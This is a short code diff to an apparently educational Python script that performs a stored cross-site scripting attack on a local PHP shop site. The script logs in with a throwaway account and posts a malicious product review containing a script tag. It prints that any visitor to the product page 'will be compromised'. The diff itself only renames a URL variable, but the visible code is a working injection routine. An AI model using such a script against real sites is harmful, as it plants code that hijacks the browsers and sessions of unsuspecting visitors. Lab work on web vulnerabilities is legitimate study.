@@ -32,7 +32,7 @@ The handle gets too hot, and there's a weird smell.<script>
 # The ID of the electric kettle in the DB is 81
 def perform_stored_xss(username="HUCKER", password="hucker123", vulnerable_site_url="http://localhost/CyberProject/product_view.php?id=81"):
     # split() returns a list of the parts of the URL [0] is the base url
-    base_url = target_url.split("/product_view.php")[0]
+    base_url = vulnerable_site_url.split("/product_view.php")[0]
     login_url = f"{base_url}/login.php"
 
     session = requests.Session()
@@ -60,11 +60,11 @@ def perform_stored_xss(username="HUCKER", password="hucker123", vulnerable_site_
     }
 
     # Sending the malicious review
-    inject_response = session.post(target_url, data=review_data)
+    inject_response = session.post(vulnerable_site_url, data=review_data)
 
     if inject_response.status_code == 200:
         print("[SUCCESS] Payload injected successfully into the database!")
-        print(f"[!] Now, any user visiting {target_url} will be compromised.")
+        print(f"[!] Now, any user visiting {vulnerable_site_url} will be compromised.")
         return True
     else:
         print("[!] Failed to inject payload.")
